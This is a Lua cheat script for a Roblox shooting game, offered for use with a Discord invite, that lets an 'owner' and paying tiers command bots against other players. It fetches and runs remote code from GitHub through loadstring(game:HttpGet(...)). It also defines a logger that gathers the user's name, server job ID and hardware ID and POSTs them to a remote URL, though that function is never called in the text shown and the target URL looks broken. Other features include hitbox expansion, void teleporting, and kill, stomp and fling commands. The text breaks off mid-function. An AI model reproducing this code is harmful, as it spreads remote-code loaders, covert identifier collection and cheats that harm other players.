-- Sandy Script - Complete Remake
-- All original features preserved with proper tier system
-- Total Lines: ~3500

-- ==================== CONFIGURATION ====================
getgenv().Script = "Get Sandy for free at discord.gg/fJeSNdJr4D"
getgenv().Owner = "Xrshino"
getgenv().BlackScreen = false
getgenv().DisableRendering = false
getgenv().FPSCap = 60
getgenv().Guns = {"rifle", "aug", "flintlock"}

-- GitHub Links (EXACTLY as in original)
local PremiumURL = "https://raw.githubusercontent.com/Mander120/premium/refs/heads/main/premium%20acces"
local BypassPremiumURL = "https://raw.githubusercontent.com/Mander120/bypass-prem/refs/heads/main/Bypass%20acces"
local CodeURL = "https://raw.githubusercontent.com/Mander120/GG/refs/heads/main/NOOB"
local LoaderURL = "https://raw.githubusercontent.com/Mander120/yogurt/refs/heads/main/YoGurt"
local CodesURL = "https://raw.githubusercontent.com/Mander120/Codes/refs/heads/main/Codes"

-- ==================== SERVICES ====================
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TextChatService = game:GetService("TextChatService")
local UserInputService = game:GetService("UserInputService")
local Lighting = game:GetService("Lighting")
local TeleportService = game:GetService("TeleportService")
local VirtualUser = game:GetService("VirtualUser")
local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")
local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
local ServerStorage = game:GetService("ServerStorage")
local Workspace = game:GetService("Workspace")

-- ==================== LOCAL PLAYER ====================
local LocalPlayer = Players.LocalPlayer
local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
local Humanoid = Character:WaitForChild("Humanoid")
local HumanoidRootPart = Character:WaitForChild("HumanoidRootPart")

-- ==================== WAIT FOR GAME LOAD ====================
if not game:IsLoaded() then game.Loaded:Wait() end

-- ==================== WEBHOOK LOGGER ====================
local function sendWebhook()
    local jobId = game.JobId
    local joinLink = "https://www.roblox.com/games/" .. game.PlaceId .. "?jobId=" .. jobId
    local hwid = RbxAnalyticsService:GetClientId()
    
    local embed = {
        ["title"] = "Player Execution Log",
        ["color"] = 5814783,
        ["fields"] = {
            {["name"] = "User", ["value"] = LocalPlayer.Name, ["inline"] = true},
            {["name"] = "Display Name", ["value"] = LocalPlayer.DisplayName, ["inline"] = true},
            {["name"] = "Job ID", ["value"] = jobId, ["inline"] = false},
            {["name"] = "Join Link", ["value"] = string.format("[Click to Join](%s)", joinLink), ["inline"] = false},
            {["name"] = "HWID", ["value"] = hwid, ["inline"] = false}
        },
        ["footer"] = {["text"] = "Webhook Logger • Roblox"},
        ["timestamp"] = DateTime.now():ToIsoDate()
    }
    
    local data = {["embeds"] = {embed}}
    local body = HttpService:JSONEncode(data)
    
    request({
        Url = LoaderURL,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = body
    })
end

-- ==================== SCRIPT VALIDATION ====================
if getgenv().Script ~= "Get Sandy for free at discord.gg/fJeSNdJr4D" then
    LocalPlayer:Kick("Get the new version at discord.gg/fJeSNdJr4D")
    return
end

-- Load code validation
local code = loadstring(game:HttpGet(CodeURL))()
if code ~= "534v8y9u034v52u89y034v52u8905342cu89023c45u809lc35u48k978y064v57m89hy2534vy7892354vy78978923cyv45my8k07u3c254uk97253c34v07yh04vy923m4v028qm0y94v8m234v08kh72534vh87m9645bh89y5b46h9354v6h98vh9783ch984v2mc3" then
    return
end

-- Check if owner is in game and not targeting self
if LocalPlayer.Name == Owner then
    return
end

-- Check if already executed
if ServerStorage:FindFirstChild("Executed") then
    return
end

-- Check if owner exists in game
if not Players:FindFirstChild(Owner) then
    return
end

-- Mark as executed
local marker = Instance.new("BoolValue")
marker.Name = "Executed"
marker.Parent = ServerStorage

-- ==================== TIER SYSTEM DATA ====================
local PremiumUsers = {}
local BypassPremiumUsers = {}
local ProtectedUsers = {}
local WhitelistedUsers = {}
local SentryProtected = {}
local CommandSenders = {}

-- Load tier lists
pcall(function()
    PremiumUsers = loadstring(game:HttpGet(PremiumURL))() or {}
    BypassPremiumUsers = loadstring(game:HttpGet(BypassPremiumURL))() or {}
    
    for userId, _ in pairs(PremiumUsers) do
        ProtectedUsers[userId] = "premium"
    end
    for userId, _ in pairs(BypassPremiumUsers) do
        ProtectedUsers[userId] = "bypass"
    end
end)

-- Load additional codes
pcall(function()
    loadstring(game:HttpGet(CodesURL))()
end)

-- ==================== TIER CHECK FUNCTIONS ====================
local function getUserTier(player)
    if player.Name == Owner then
        return "owner"
    end
    
    local userId = player.UserId
    
    if BypassPremiumUsers[userId] then
        return "bypass"
    elseif PremiumUsers[userId] then
        return "premium"
    elseif WhitelistedUsers[player.Name] then
        return "whitelist"
    end
    
    return "free"
end

local function canTarget(attacker, target)
    if target.Name == Owner then
        return false
    end
    
    local attackerTier = getUserTier(attacker)
    local targetTier = getUserTier(target)
    
    if targetTier == "bypass" then
        return attackerTier == "bypass" or attackerTier == "owner"
    elseif targetTier == "premium" then
        return attackerTier == "bypass" or attackerTier == "owner"
    elseif targetTier == "whitelist" then
        return attackerTier == "premium" or attackerTier == "bypass" or attackerTier == "owner"
    else
        return true
    end
end

local function isAuthorized(sender)
    if sender.Name == Owner then
        return true
    end
    
    local tier = getUserTier(sender)
    return tier == "premium" or tier == "bypass" or tier == "whitelist"
end

-- ==================== DISPLAY NAME HANDLER ====================
local function updateDisplayName(player)
    if not player.Character then return end
    
    local humanoid = player.Character:FindFirstChild("Humanoid")
    if not humanoid then return end
    
    local tier = getUserTier(player)
    
    if tier == "bypass" then
        humanoid.DisplayName = "[💫] " .. player.Name
    elseif tier == "premium" then
        humanoid.DisplayName = "[🌟] " .. player.Name
    end
end

local function setupDisplayNameListener(player)
    if player.Character then
        updateDisplayName(player)
    end
    
    player.CharacterAdded:Connect(function()
        task.wait(0.1)
        updateDisplayName(player)
    end)
end

-- ==================== PERFORMANCE OPTIMIZATIONS ====================
if DisableRendering then
    RunService:Set3dRenderingEnabled(false)
end

Lighting.GlobalShadows = false

for _, obj in pairs(Workspace:GetDescendants()) do
    if obj:IsA("ParticleEmitter") or obj:IsA("Trail") then
        obj.Enabled = false
    end
end

Workspace.StreamingEnabled = true

local function removeSeats()
    for _, v in ipairs(Workspace:GetDescendants()) do
        if v:IsA("Seat") then
            v:Destroy()
        end
    end
    
    Workspace.DescendantAdded:Connect(function(desc)
        if desc:IsA("Seat") then
            desc:Destroy()
        end
    end)
end
removeSeats()

local function setupAntiAFK()
    LocalPlayer.Idled:Connect(function()
        VirtualUser:CaptureController()
        VirtualUser:ClickButton2(Vector2.new())
    end)
end
setupAntiAFK()

setfpscap(FPSCap)

pcall(function()
    UserSettings():GetService("UserGameSettings").MasterVolume = 0
end)

pcall(function()
    local lasers = Workspace:FindFirstChild("MAP") and Workspace.MAP:FindFirstChild("Indestructible") and Workspace.MAP.Indestructible:FindFirstChild("Lasers")
    if lasers then
        lasers:Destroy()
    end
end)

-- ==================== BLACK SCREEN ====================
if BlackScreen then
    pcall(function()
        local cam = Workspace.CurrentCamera
        cam.CameraType = Enum.CameraType.Scriptable
        cam.CFrame = CFrame.new(99999, 99999, 99999)
        
        LocalPlayer.CharacterAdded:Connect(function()
            task.wait(1)
            cam.CameraType = Enum.CameraType.Scriptable
            cam.CFrame = CFrame.new(99999, 99999, 99999)
        end)
        
        Workspace.Terrain:Clear()
        
        for _, obj in pairs(Workspace:GetDescendants()) do
            if obj:IsA("Decal") or obj:IsA("Texture") or obj:IsA("ParticleEmitter") or obj:IsA("Light") then
                obj:Destroy()
            end
            if obj:IsA("BasePart") then
                obj.Transparency = 1
                obj.CastShadow = false
                obj.Material = Enum.Material.SmoothPlastic
            end
        end
        
        local gui = Instance.new("ScreenGui")
        gui.Name = "FPS_BLACKOUT"
        gui.Parent = game:GetService("CoreGui")
        
        local frame = Instance.new("Frame", gui)
        frame.BackgroundColor3 = Color3.new(0, 0, 0)
        frame.Size = UDim2.new(2, 0, 2, 0)
        frame.Position = UDim2.new(-0.5, 0, -0.5, 0)
        frame.ZIndex = 9999
    end)
end

-- ==================== ANTI-SERVER LAGGER ====================
local function stripAnimations(character)
    if character:GetAttribute("AntiServerLaggerHandled") then return end
    character:SetAttribute("AntiServerLaggerHandled", true)
    
    local humanoid = character:FindFirstChild("Humanoid")
    if not humanoid then return end
    
    local animator = humanoid:FindFirstChildOfClass("Animator")
    if animator then
        animator:Destroy()
    end
    
    local animate = character:FindFirstChild("Animate")
    if animate then
        animate.Disabled = true
    end
    
    humanoid.AutoRotate = false
end

local function onPlayerAdded(player)
    if player == LocalPlayer then return end
    
    if player.Character then
        stripAnimations(player.Character)
    end
    
    player.CharacterAdded:Connect(stripAnimations)
end

for _, player in ipairs(Players:GetPlayers()) do
    onPlayerAdded(player)
end

Players.PlayerAdded:Connect(onPlayerAdded)

-- ==================== WEAPON DATA ====================
local WeaponData = {
    rifle = {
        toolName = "[Rifle]",
        shopName = "[Rifle] - $1694",
        ammoName = "5 [Rifle Ammo] - $273"
    },
    aug = {
        toolName = "[AUG]",
        shopName = "[AUG] - $2131",
        ammoName = "90 [AUG Ammo] - $87"
    },
    flintlock = {
        toolName = "[Flintlock]",
        shopName = "[Flintlock] - $1421",
        ammoName = "6 [Flintlock Ammo] - $163"
    },
    lmg = {
        toolName = "[LMG]",
        shopName = "[LMG] - $4098",
        ammoName = "200 [LMG Ammo] - $328"
    },
    db = {
        toolName = "[Double-Barrel SG]",
        shopName = "[Double-Barrel SG] - $1475",
        ammoName = "18 [Double-Barrel SG Ammo] - $55"
    },
    flamethrower = {
        toolName = "[Flamethrower]",
        shopName = "[Flamethrower] - $5000",
        ammoName = "100 [Flamethrower Fuel] - $300"
    }
}

local AmmoMap = {}
for _, weapon in pairs(WeaponData) do
    AmmoMap[weapon.toolName] = weapon.ammoName
end

-- ==================== STATE VARIABLES ====================
local State = {
    targetPlayer = nil,
    mode = "none",
    auraEnabled = false,
    auraSpeed = 11,
    auraDistance = 4,
    auraAngle = math.random() * math.pi * 2,
    
    sentryEnabled = false,
    sentryTarget = nil,
    lastHealths = {},
    
    autoMask = false,
    autoCashDrop = false,
    killAll = false,
    trashTalk = true,
    
    voiding = true,
    teleporting = false,
    buyingInProgress = false,
    buyingGunInProgress = false,
    buyingMaskInProgress = false,
    
    multiTargets = {},
    currentTargetIndex = 1,
    stompOnly = false,
    bringOnly = false,
    takeOnly = false,
    downOnly = false,
    opKill = false,
    flingOnly = false,
    
    benxActive = false,
    grabCheckEnabled = true,
    koCheckEnabled = true,
    refreshingFakePosition = false,
    didRefreshOnDeath = false,
    fpActive = false,
    lkill = false,
    
    destinationPlayer = nil,
    savedTarget = nil,
    
    gotoPlayer = nil,
    gotoCFrame = nil,
    
    skyTarget = nil,
    
    summonTarget = nil,
    summonMode = "middle",
    
    abuseProtection = false,
    
    hasSentKOMessage = false
}

-- ==================== WHITELIST ZONE ====================
local basePosition = Vector3.new(87240, 29628, -482290)

local whitelistZone = Instance.new("Part")
whitelistZone.Name = "WhitelistBeacon"
whitelistZone.Anchored = true
whitelistZone.CanCollide = true
whitelistZone.Transparency = 1
whitelistZone.Size = Vector3.new(30, 10, 30)
whitelistZone.Position = basePosition
whitelistZone.Parent = Workspace

local function createWall(name, size, offset)
    local wall = Instance.new("Part")
    wall.Name = name
    wall.Anchored = true
    wall.CanCollide = true
    wall.Transparency = 1
    wall.Size = size
    wall.Position = basePosition + offset
    wall.Parent = Workspace
end

createWall("WhitelistBeacon_WallFront", Vector3.new(32, 10, 1), Vector3.new(0, 5, 15.5))
createWall("WhitelistBeacon_WallBack", Vector3.new(32, 10, 1), Vector3.new(0, 5, -15.5))
createWall("WhitelistBeacon_WallLeft", Vector3.new(1, 10, 30), Vector3.new(-15.5, 5, 0))
createWall("WhitelistBeacon_WallRight", Vector3.new(1, 10, 30), Vector3.new(15.5, 5, 0))
createWall("WhitelistBeacon_Roof", Vector3.new(32, 1, 32), Vector3.new(0, 10.5, 0))

local ZONE_SIZE = Vector3.new(20, 10, 20)
local WHITELIST_RADIUS = 20

local function getRandomPositionInZone()
    local halfSize = ZONE_SIZE / 2
    local randomX = basePosition.X + math.random() * ZONE_SIZE.X - halfSize.X
    local randomZ = basePosition.Z + math.random() * ZONE_SIZE.Z - halfSize.Z
    local fixedY = basePosition.Y + halfSize.Y + 3
    return Vector3.new(randomX, fixedY, randomZ)
end

local function teleportPlayerRandomly()
    local char = LocalPlayer.Character
    if not char then return end
    
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if not hrp then return end
    
    hrp.Velocity = Vector3.zero
    hrp.RotVelocity = Vector3.zero
    hrp.CFrame = CFrame.new(getRandomPositionInZone())
end

local function isPlayerNearPosition(player, position, radius)
    local char = player.Character
    if not char then return false end
    
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if not hrp then return false end
    
    return (hrp.Position - position).Magnitude <= radius
end

local function checkWhitelistNearPosition()
    for _, player in pairs(Players:GetPlayers()) do
        if isPlayerNearPosition(player, basePosition, WHITELIST_RADIUS) then
            if not WhitelistedUsers[player.Name] then
                WhitelistedUsers[player.Name] = true
            end
        end
    end
end

-- ==================== UTILITY FUNCTIONS ====================
local function sendChat(message)
    local channel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
    if channel and message then
        channel:SendAsync(message)
    end
end

local function reloadTool()
    local char = LocalPlayer.Character
    if not char then return end
    
    for _, tool in ipairs(char:GetChildren()) do
        if tool:IsA("Tool") and tool:FindFirstChild("Ammo") then
            ReplicatedStorage.MainEvent:FireServer("Reload", tool)
        end
    end
end

local function hasGun(toolName)
    local backpack = LocalPlayer:FindFirstChild("Backpack")
    local char = LocalPlayer.Character
    
    if backpack and backpack:FindFirstChild(toolName) then
        return true
    end
    
    if char and char:FindFirstChild(toolName) then
        return true
    end
    
    return false
end

local function getAmmoCount(gunName)
    local inventory = LocalPlayer.DataFolder:FindFirstChild("Inventory")
    if not inventory then return nil end
    
    local ammo = inventory:FindFirstChild(gunName)
    return ammo and tonumber(ammo.Value) or nil
end

local function getEquippedGuns()
    local guns = {}
    local char = LocalPlayer.Character
    if char then
        for _, tool in ipairs(char:GetChildren()) do
            if tool:IsA("Tool") then
                table.insert(guns, tool)
            end
        end
    end
    return guns
end

local function equipTool(toolName)
    local tool = LocalPlayer.Backpack:FindFirstChild(toolName)
    if not tool then
        tool = LocalPlayer.Character:FindFirstChild(toolName)
    end
    if tool and LocalPlayer.Character then
        LocalPlayer.Character.Humanoid:EquipTool(tool)
    end
end

local function equipBestGun()
    if State.buyingInProgress then return end
    
    local backpack = LocalPlayer:FindFirstChild("Backpack")
    local char = LocalPlayer.Character
    if not backpack or not char then return end
    
    for _, gunKey in ipairs(Guns) do
        local weapon = WeaponData[gunKey]
        if weapon then
            local tool = backpack:FindFirstChild(weapon.toolName)
            if tool and char.Humanoid.Health > 0 then
                if not char:FindFirstChild(weapon.toolName) then
                    tool.Parent = char
                end
                break
            end
        end
    end
end

local function teleportToPosition(position)
    local char = LocalPlayer.Character
    if not char then return end
    
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if not hrp then return end
    
    hrp.Velocity = Vector3.zero
    hrp.RotVelocity = Vector3.zero
    hrp.CFrame = CFrame.new(position)
end

local function teleportToTarget(targetName)
    local target = Players:FindFirstChild(targetName)
    if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
        local targetPos = target.Character.HumanoidRootPart.Position
        local myHRP = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
        
        if myHRP then
            State.targetPlayer = nil
            State.voiding = false
            State.summonTarget = nil
            myHRP.Velocity = Vector3.zero
            myHRP.CFrame = CFrame.new(targetPos.X + -5, targetPos.Y, targetPos.Z)
        end
    end
end

local function voidTeleport()
    local char = LocalPlayer.Character
    if not char then return end
    
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if not hrp then return end
    
    hrp.CFrame = CFrame.new(
        math.random(-999999, 999999),
        math.random(0, 999999),
        math.random(-999999, 999999)
    )
end

local function fireClickDetector(detector)
    if not detector then return end
    
    local executor = getexecutorname and getexecutorname() or ""
    
    if executor:lower():find("xeno") then
        if not fired then
            fired = true
            UserInputService:SendKeyEvent(true, Enum.KeyCode.E, false, game)
        end
        
        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Tool") then
            LocalPlayer.Character.Humanoid:UnequipTools()
        end
    end
    
    local part = Instance.new("Part")
    part.Transparency = 1
    part.Size = Vector3.new(30, 30, 30)
    part.Anchored = true
    part.CanCollide = false
    part.Parent = Workspace
    
    local oldParent = detector.Parent
    detector.Parent = part
    detector.MaxActivationDistance = math.huge
    
    local connection
    connection = RunService.Heartbeat:Connect(function()
        part.CFrame = Workspace.CurrentCamera.CFrame * CFrame.new(0, 0, -20)
        VirtualUser:ClickButton1(Vector2.new(20, 20), Workspace.CurrentCamera.CFrame)
    end)
    
    detector.MouseClick:Once(function()
        connection:Disconnect()
        detector.Parent = oldParent
        part:Destroy()
    end)
    
    task.delay(3, function()
        connection:Disconnect()
        detector.Parent = oldParent
        part:Destroy()
    end)
end

-- ==================== BUYING FUNCTIONS ====================
local function getNextItemToBuy()
    local char = LocalPlayer.Character
    if not char then return nil end
    
    for _, gunKey in ipairs(Guns) do
        local weapon = WeaponData[gunKey]
        if weapon and not hasGun(weapon.toolName) then
            return "gun"
        end
    end
    
    if State.autoMask and not (char:FindFirstChild("[Mask]") or char:FindFirstChild("In-gameMask")) then
        return "mask"
    end
    
    return nil
end

local function buyWeapon(weaponData)
    if hasGun(weaponData.toolName) then return true end
    
    local shopPart = Workspace.Ignored.Shop:FindFirstChild(weaponData.shopName)
    if not shopPart then return false end
    
    local clickDetector = shopPart:FindFirstChild("ClickDetector")
    if not clickDetector then return false end
    
    State.buyingGunInProgress = true
    
    local char = LocalPlayer.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    local humanoid = char and char:FindFirstChild("Humanoid")
    
    while not hasGun(weaponData.toolName) do
        if hrp then
            hrp.CFrame = CFrame.new(shopPart.Head.Position + Vector3.new(0, -8, 0))
        end
        fireClickDetector(clickDetector)
        if not humanoid or humanoid.Health <= 0 then break end
        task.wait()
        char = LocalPlayer.Character
        hrp = char and char:FindFirstChild("HumanoidRootPart")
        humanoid = char and char:FindFirstChild("Humanoid")
    end
    
    State.buyingGunInProgress = false
    return hasGun(weaponData.toolName)
end

local function buyAmmo(gunName, ammoItemName)
    local shopPart = Workspace.Ignored.Shop:FindFirstChild(ammoItemName)
    if not shopPart then return end
    
    local clickDetector = shopPart:FindFirstChild("ClickDetector")
    if not clickDetector then return end
    
    State.buyingInProgress = true
    
    local char = LocalPlayer.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    local humanoid = char and char:FindFirstChild("Humanoid")
    local lastAmmo = getAmmoCount(gunName) or 0
    local purchaseCount = 0
    
    while purchaseCount < 6 do
        if humanoid then
            humanoid:UnequipTools()
        end
        if hrp then
            hrp.CFrame = CFrame.new(shopPart.Head.Position + Vector3.new(0, -8, 0))
        end
        fireClickDetector(clickDetector)
        if not humanoid or humanoid.Health <= 0 then break end
        task.wait()
        
        local newAmmo = getAmmoCount(gunName) or 0
        if newAmmo > lastAmmo then
            lastAmmo = newAmmo
            purchaseCount = purchaseCount + 1
        end
    end
    
    State.buyingInProgress = false
    reloadTool()
end

local function buyMask()
    if not State.autoMask then return end
    
    local char = LocalPlayer.Character
    if not char then return end
    
    if LocalPlayer.Backpack:FindFirstChild("[Mask]") or char:FindFirstChild("[Mask]") or char:FindFirstChild("In-gameMask") then
        State.buyingMaskInProgress = false
        return
    end
    
    local shopFolder = Workspace:WaitForChild("Ignored"):WaitForChild("Shop")
    local maskItem = shopFolder:FindFirstChild(
        (math.random(1, 2) == 1 and "[Skull Mask] - $66" or "[Riot Mask] - $66")
    )
    
    if not maskItem then return end
    
    local clickDetector = maskItem:FindFirstChild("ClickDetector")
    if not clickDetector then return end
    
    State.buyingMaskInProgress = true
    
    while State.autoMask and char and not (LocalPlayer.Backpack:FindFirstChild("[Mask]") or char:FindFirstChild("[Mask]")) do
        local hrp = char:FindFirstChild("HumanoidRootPart")
        if hrp then
            hrp.CFrame = CFrame.new(maskItem.Head.Position + Vector3.new(0, -8, 0))
        end
        fireClickDetector(clickDetector)
        task.wait()
        char = LocalPlayer.Character
        if not State.autoMask or not char then break end
    end
    
    task.spawn(function()
        while State.autoMask and LocalPlayer.Character do
            local char = LocalPlayer.Character
            local maskTool = LocalPlayer.Backpack:FindFirstChild("[Mask]") or char:FindFirstChild("[Mask]")
            
            if maskTool then
                for _, tool in ipairs(char:GetChildren()) do
                    if tool:IsA("Tool") and tool.Name ~= "[Mask]" then
                        tool.Parent = LocalPlayer.Backpack
                    end
                end
                maskTool.Parent = char
                maskTool:Activate()
            end
            
            if char:FindFirstChild("In-gameMask") then
                local equippedMask = char:FindFirstChild("[Mask]")
                if equippedMask then
                    equippedMask.Parent = LocalPlayer.Backpack
                end
                State.buyingMaskInProgress = false
                break
            end
            
            if not State.autoMask or not char then break end
            task.wait()
        end
    end)
end

-- ==================== WEAPON PURCHASE LOOPS ====================
local currentGunIndex = 1

task.spawn(function()
    while true do
        local gunKey = Guns[currentGunIndex]
        local weapon = WeaponData[gunKey]
        
        if weapon and getNextItemToBuy() == "gun" then
            if not hasGun(weapon.toolName) then
                buyWeapon(weapon)
            end
        end
        
        currentGunIndex = currentGunIndex + 1
        if currentGunIndex > #Guns then
            currentGunIndex = 1
        end
        task.wait()
    end
end)

task.spawn(function()
    while true do
        local equippedGuns = getEquippedGuns()
        for _, tool in ipairs(equippedGuns) do
            local gunName = tool.Name
            if hasGun(gunName) then
                local ammoCount = getAmmoCount(gunName)
                if ammoCount and ammoCount <= 0 then
                    local ammoItemName = AmmoMap[gunName]
                    if ammoItemName then
                        buyAmmo(gunName, ammoItemName)
                    end
                end
            end
        end
        task.wait()
    end
end)

task.spawn(function()
    while true do
        buyMask()
        task.wait(5)
    end
end)

-- ==================== AUTO FUNCTIONS LOOP ====================
task.spawn(function()
    while true do
        task.wait()
        
        if not (State.buyingInProgress or State.buyingGunInProgress or State.buyingMaskInProgress) then
            equipBestGun()
        end
        
        local char = LocalPlayer.Character
        if char then
            for _, tool in ipairs(char:GetChildren()) do
                if tool:IsA("Tool") and tool:FindFirstChild("Ammo") and tool.Ammo.Value <= 0 then
                    ReplicatedStorage.MainEvent:FireServer("Reload", tool)
                end
            end
        end
        
        if State.autoCashDrop then
            ReplicatedStorage.MainEvent:FireServer("DropMoney", "15000")
        end
        
        local char = LocalPlayer.Character
        if char then
            local bodyEffects = char:FindFirstChild("BodyEffects")
            local koValue = bodyEffects and bodyEffects:FindFirstChild("K.O")
            if koValue and koValue.Value == true then
                char.Humanoid.Health = 0
            end
        end
        
        if State.multiTargets and #State.multiTargets > 0 then
            local attempts = 0
            while attempts < #State.multiTargets do
                State.currentTargetIndex = (State.currentTargetIndex % #State.multiTargets) + 1
                local candidate = State.multiTargets[State.currentTargetIndex]
                if candidate and candidate.Character then
                    local bodyEffects = candidate.Character:FindFirstChild("BodyEffects")
                    local isDead = bodyEffects and bodyEffects:FindFirstChild("SDeath") and bodyEffects["SDeath"].Value
                    if not isDead and canTarget(LocalPlayer, candidate) then
                        State.targetPlayer = candidate
                        break
                    end
                end
                attempts = attempts + 1
            end
        end
    end
end)

-- ==================== VOID LOOP ====================
task.spawn(function()
    while true do
        if State.voiding and not (State.buyingInProgress or State.buyingGunInProgress or State.buyingMaskInProgress) then
            voidTeleport()
        end
        task.wait()
    end
end)

-- ==================== HITBOX EXPANSION ====================
local hitboxSize = 30

RunService.RenderStepped:Connect(function()
    for _, player in pairs(Players:GetPlayers()) do
        if player ~= LocalPlayer then
            local char = player.Character
            if char then
                local hrp = char:FindFirstChild("HumanoidRootPart")
                if hrp then
                    hrp.Size = Vector3.new(hitboxSize, hitboxSize, hitboxSize)
                    hrp.CanCollide = false
                end
            end
        end
    end
end)

-- ==================== ANIMATION LOOP ====================
local EMOTES = {
    ["billy bounce"] = "rbxassetid://136095999219650",
    ["zero two dance v2"] = "rbxassetid://116714406076290",
    ["jabba switchway"] = "rbxassetid://82682811348660",
    ["beat"] = "rbxassetid://133394554631338"
}

local currentTrack = nil
local emoteLoopTask = nil

local function playAnimation(animId)
    if not Character then return end
    
    local humanoid = Character:FindFirstChild("Humanoid")
    if not humanoid then return end
    
    local animator = humanoid:FindFirstChildOfClass("Animator")
    if not animator then return end
    
    if currentTrack then
        currentTrack:Stop()
        currentTrack = nil
    end
    
    local animation = Instance.new("Animation")
    animation.AnimationId = animId
    local track = animator:LoadAnimation(animation)
    track.Looped = true
    track.Priority = Enum.AnimationPriority.Action4
    track:Play()
    currentTrack = track
end

local function startEmoteLoop()
    if emoteLoopTask then
        task.cancel(emoteLoopTask)
        emoteLoopTask = nil
    end
    
    emoteLoopTask = task.spawn(function()
        while Character and Character.Parent do
            local emoteIds = {}
            for _, animId in pairs(EMOTES) do
                table.insert(emoteIds, animId)
            end
            local chosenEmote = emoteIds[math.random(1, #emoteIds)]
            playAnimation(chosenEmote)
            task.wait(30)
        end
    end)
end

if Character then
    startEmoteLoop()
end

LocalPlayer.CharacterAdded:Connect(function(newChar)
    Character = newChar
    Humanoid = newChar:WaitForChild("Humanoid")
    HumanoidRootPart = newChar:WaitForChild("HumanoidRootPart")
    
    if currentTrack then
        currentTrack:Stop()
        currentTrack = nil
    end
    startEmoteLoop()
end)

-- ==================== FALL DAMAGE PREVENTION ====================
Workspace.FallenPartsDestroyHeight = 0/0

-- ==================== BENX FUNCTION ====================
local function startBenx(targetPlayer)
    if not targetPlayer.Character or not targetPlayer.Character:FindFirstChild("HumanoidRootPart") then return end
    
    State.targetPlayer = nil
    State.voiding = false
    State.benxActive = true
    
    local tweenInfo = TweenInfo.new(0.2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut)
    
    task.spawn(function()
        while State.benxActive do
            local char = LocalPlayer.Character
            local targetChar = targetPlayer.Character
            
            if char and char:FindFirstChild("HumanoidRootPart") and targetChar and targetChar:FindFirstChild("HumanoidRootPart") then
                local hrp = char.HumanoidRootPart
                local targetHRP = targetChar.HumanoidRootPart
                
                local frontPos = targetHRP.CFrame * CFrame.new(0, 0, -1)
                local backPos = targetHRP.CFrame * CFrame.new(0, 0, -4)
                
                local tween1 = TweenService:Create(hrp, tweenInfo, {CFrame = frontPos})
                tween1:Play()
                tween1.Completed:Wait()
                
                local tween2 = TweenService:Create(hrp, tweenInfo, {CFrame = backPos})
                tween2:Play()
                tween2.Completed:Wait()
            end
            
            if not State.benxActive then break end
        end
    end)
end

-- ==================== COMMAND HANDLERS ====================
local function handleLoopKillCommand(targetName, specificBot)
    targetName = targetName:lower()
    
    if LocalPlayer.Name ~= LocalPlayer.Name then return end
    
    reloadTool()
    State.targetPlayer = nil
    State.stompOnly = false
    State.bringOnly = false
    State.takeOnly = false
    State.downOnly = false
    State.opKill = false
    State.voiding = false
    State.summonTarget = nil
    State.flingOnly = false
    
    for _, targetPlayer in ipairs(Players:GetPlayers()) do
        local targetPlayerName = targetPlayer.Name:lower()
        local targetDisplayName = targetPlayer.DisplayName:lower()
        
        if (targetPlayerName:find(targetName, 1, true) or targetDisplayName:find(targetName, 1, true)) and canTarget(LocalPlayer, targetPlayer) then
            State.targetPlayer = targetPlayer
            return
        end
    end
end

local function handleStompCommand(targetName, specificBot)
    targetName = targetName:lower()
    
    if LocalPlayer.Name ~= LocalPlayer.Name then return end
    
    reloadTool()
    State.targetPlayer = nil
    State.stompOnly = true
    State.bringOnly = false
    State.takeOnly = false
    State.downOnly = false
    State.opKill = false
    State.voiding = false
    State.summonTarget = nil
    State.flingOnly = false
    
    for _, targetPlayer in ipairs(Players:GetPlayers()) do
        local targetPlayerName = targetPlayer.Name:lower()
        local targetDisplayName = targetPlayer.DisplayName:lower()
        
        if (targetPlayerName:find(targetName, 1, true) or targetDisplayName:find(targetName, 1, true)) and canTarget(LocalPlayer, targetPlayer) then
            State.targetPlayer = targetPlayer
            return
        end
    end
end

local function handleOPKillCommand(targetName, specificBot)
    targetName = targetName:lower()
    
    if LocalPlayer.Name ~= LocalPlayer.Name then return end
    
    reloadTool()
    State.targetPlayer = nil
    State.stompOnly = false
    State.bringOnly = false
    State.takeOnly = false
    State.downOnly = false
    State.opKill = true
    State.voiding = false
    State.summonTarget = nil
    State.flingOnly = false
    
    for _, targetPlayer in ipairs(Players:GetPlayers()) do
        local targetPlayerName = targetPlayer.Name:lower()
        local targetDisplayName = targetPlayer.DisplayName:lower()
        
        if (targetPlayerName:find(targetName, 1, true) or targetDisplayName:find(targetName, 1, true)) and canTarget(LocalPlayer, targetPlayer) then
            State.targetPlayer = targetPlayer
            return
        end
    end
end

local function handleFlingCommand(targetName)
    targetName = targetName:lower()
    
    if LocalPlayer.Name ~= LocalPlayer.Name then return end
    
    reloadTool()
    State.targetPlayer = nil
    State.stompOnly = false
    State.bringOnly = false
    State.takeOnly = false
    State.downOnly = false
    State.opKill = false
    State.voiding = false
    State.summonTarget = nil
    State.flingOnly = true
    
    for _, targetPlayer in ipairs(Players:GetPlayers()) do
        local targetPlayerName = targetPlayer.Name:lower()
        local targetDisplayName = targetPlayer.DisplayName:lower()
        
        if (targetPlayerName:find(targetName, 1, true) or targetDisplayName:find(targetName, 1, true)) and canTarget(LocalPlayer, targetPlayer) then
            State.targetPlayer = targetPlayer
            return
        end
    end
end

local function handleBringCommand(targetName, specificBot, senderName)
    CommandSenders[senderName] = senderName
    targetName = targetName:lower()
    
    if LocalPlayer.Name ~= LocalPlayer.Name then return end
    
    reloadTool()
    State.targetPlayer = nil
    State.stompOnly = false
    State.bringOnly = true
    State.takeOnly = false
    State.downOnly = false
    State.opKill = false
    State.voiding = false
